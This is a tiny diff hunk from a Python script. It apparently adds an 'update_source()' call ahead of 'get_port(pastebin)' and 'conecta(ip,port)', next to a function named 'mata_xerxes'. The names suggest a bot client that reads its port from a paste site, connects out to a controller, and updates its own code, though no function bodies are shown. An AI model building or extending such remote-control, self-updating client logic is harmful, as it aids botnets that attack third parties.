@@ -176,7 +176,7 @@ def mata_xerxes():
       out.remove(pid)
 
 
-
+update_source()
 get_port(pastebin)
 conecta(ip,port)
 
